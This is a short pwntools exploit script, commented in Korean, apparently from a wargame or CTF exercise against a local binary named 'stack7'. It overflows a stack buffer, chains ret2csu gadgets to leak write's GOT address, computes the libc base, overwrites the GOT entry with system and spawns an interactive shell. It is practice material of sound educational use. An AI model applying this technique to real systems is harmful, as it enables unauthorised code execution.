from pwn import *

p = process('./stack7')

# libc_csu_init에 있는 가젯 먼저 획득
# + ropgadget에서 pop rid; ret 가젯 획득
gadget1 = 0x401200
gadget2 = 0x40121a
pop_rdi_ret = 0x401223

# ret2libc를 위해
# 사용할 동적 라이브러리 함수인 write, read 함수의 plt, got 주소들
write_plt = 0x401060
write_got = 0x404018
read_plt = 0x401080
read_got = 0x404028

# payload 작성
payload = b'A' * 0x48   # 스택 버퍼 덮어주기

# write(1, wirte_got, 8) 호출을 위한 gadget 설정
payload += p64(gadget2) # gadget2를 통해 레지스터 세팅
payload += p64(0)   # rbx 설정
payload += p64(1)   # rbp 설정
payload += p64(1)   # arg1 설정
payload += p64(write_got)   # arg2 설정
payload += p64(8)   # arg3 설정
payload += p64(write_got)   # write()를 실행할 예정
payload += p64(gadget1)

# read(0, write_got, 16) 호출
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(0)
payload += p64(write_got)
payload += p64(16)
payload += p64(read_got)
payload += p64(gadget1)

# system("/bin/sh")
payload += p64(0) * 7
payload += p64(pop_rdi_ret) # "/bin/sh"
payload += p64(write_got + 8)   # system
payload += p64(write_plt)

p.send(payload)
# 얻어낸 write_libc 주소값 puts_libc 변수에 저장 후 libc base 주소 구하기
write_libc = u64(p.recv()[-8:])
libc_base = write_libc - 0x10e280
# libc base 주소로 system 주소 계산
system_libc = libc_base + 0x52290

print('write_libc:', hex(write_libc))
print('libc_base:', hex(libc_base))
print('system_lic:',hex(system_libc))

payload2 = p64(system_libc)
payload2 += b'/bin/sh\x00'
p.send(payload2)

p.interactive()